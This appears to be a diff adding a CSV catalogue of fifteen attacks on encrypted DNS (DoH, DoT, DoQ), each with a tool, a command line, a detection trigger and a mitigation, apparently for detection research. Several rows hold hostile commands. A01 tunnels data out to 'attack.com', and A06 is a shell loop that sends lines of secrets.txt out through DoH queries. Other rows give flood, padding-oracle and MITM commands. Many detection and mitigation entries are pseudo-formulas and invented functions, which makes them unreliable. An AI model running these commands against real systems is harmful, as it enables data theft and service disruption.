@@ -1,0 +1,16 @@
+Attack_ID,Attack_Vector,Protocol,Tool,Command_Syntax,Detection_Trigger,Mitigation_Action
+A01,DNS Tunneling via DoH,DoH,dns2tcp,python3 dns2tcp.py -z attack.com -r 53 -t A -d exfil_data.bin,ΔH > 2.5 bits/query ∧ entropy_score > 3.8,iptables -t mangle -A PREROUTING -j DIVERT_SANDBOX
+A02,Timing Side-Channel,DoT,tc + netem,tc qdisc add dev eth0 root netem delay 150ms 25ms,"corr(t_query, t_resp) < 0.1","inject_padding(random.uniform(100, 250))"
+A03,QUIC Congestion Exploit,DoQ,quic-flood,python3 quic-flood.py --pps 50000 --spin-bit 1 --version 0x00000001,cwnd_growth_rate > threshold_3σ,rate_limit = baseline * (1 - attack_ratio^2)
+A04,Certificate Injection,DoH,mitmproxy,mitmproxy --mode transparent --ssl-insecure,"verify(SNI, ALPN) == False",send_alert(21); close_connection()
+A05,Padding Oracle,DoT,padbuster,ruby padbuster.rb https://doh.server/encrypted AAAAA 8 -encoding 1,HE.eval(c1 == c2) without decryption,C' = C ⊕ H(noise || timestamp)
+A06,Slow-Drip Exfiltration,DoH,curl (shell loop),for i in $(cat secrets.txt); do curl -H 'Content-Type: application/dns-message' https://doh.server/dns-query?dns=$i; sleep $((RANDOM%3+1)); done,"autocorr(queries, lag=5) > 0.8","broadcast_alert(); limit_rate(src_ip, 5ppm)"
+A07,QUIC Version Downgrade,DoQ,Scapy (custom),modify_packet(version_field=0x00000000); replay,supported_versions ∩ offered ≠ ∅,"send_connection_close(0x010C); log_attack(version_downgrade)"
+A08,HTTP/2 Frame Storm,DoH,h2storm,"python3 h2storm.py --target doh.server --frames PING,PING,PING,DATA --interval 0.001",frames_per_second > 1000,enforce_h2_rfc7540(); blacklist_client()
+A09,Encrypted SNI Poisoning,DoH,custom middlebox injector,inject_esni(encrypted_sni=malicious.com),"HE.verify(esni, cert_hash) == False",route_to_backup_server(); alert_CA()
+A10,Adaptive Chaff Injection,DoH,custom GAN-driven chaff generator,while true; do size=$((RANDOM%512+64)); send_encrypted_query(random_bytes(size)); delay=...; done,GA.optimize(detector_weights),θ_new = θ_old + η · ∇J(θ); sandbox(flow)
+A11,DNS Query Flood,DoH,dnsperf,dnsperf -s doh.server -d queries.txt -c 100 -Q 10000 -l 60,query_rate > per_source_threshold ∨ source_ip_distribution_anomaly,rate_limit via AMPS sandbox
+A12,TLS Handshake Abuse,DoT,testssl,testssl -jsonfile log.json -vulnerable -headers,cipher_suite_mismatch,reset_dot_tls()
+A13,QUIC Reflection,DoQ,quic-attack,./quic_attack -reflect -amplify 50 -threads 16,response_size > amplification_threshold * query_size,rate_limit via AMPS sandbox
+A14,HTTP/2 Continuation Flood,DoH,h2load,h2load -n 100000 -c 1000 -m 100 https://doh.server/dns-query,continuation_count > max_concurrent_streams,enforce_h2_rfc7540()
+A15,Encrypted Payload Fuzzing,DoH,boofuzz,python3 doh_fuzzer.py --target doh.server:443 --runtime 300,wire_format_valid(payload) == False ∨ tls_decryption_error,terminate_doh_stream()
